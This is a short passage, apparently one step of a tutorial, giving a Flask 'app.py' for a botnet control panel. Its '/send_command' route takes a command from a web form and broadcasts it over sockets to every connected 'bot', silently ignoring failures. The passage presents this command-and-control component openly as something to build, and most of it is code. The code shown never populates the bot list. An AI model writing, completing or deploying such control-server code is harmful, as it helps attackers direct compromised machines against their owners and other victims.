2. **Create `app.py`**:
   ```python
   from flask import Flask, render_template, request
   import socket

   app = Flask(__name__)

   bots = {}  # Dictionary to store bot connections

   @app.route("/")
   def index():
       return render_template("index.html")

   @app.route("/send_command", methods=["POST"])
   def send_command():
       command = request.form["command"]
       for bot_id, client_socket in bots.items():
           try:
               client_socket.send(command.encode("utf-8"))
           except:
               pass
       return "Command sent to all bots"

   if __name__ == "__main__":
       app.run(host="0.0.0.0", port=5000)
   ```
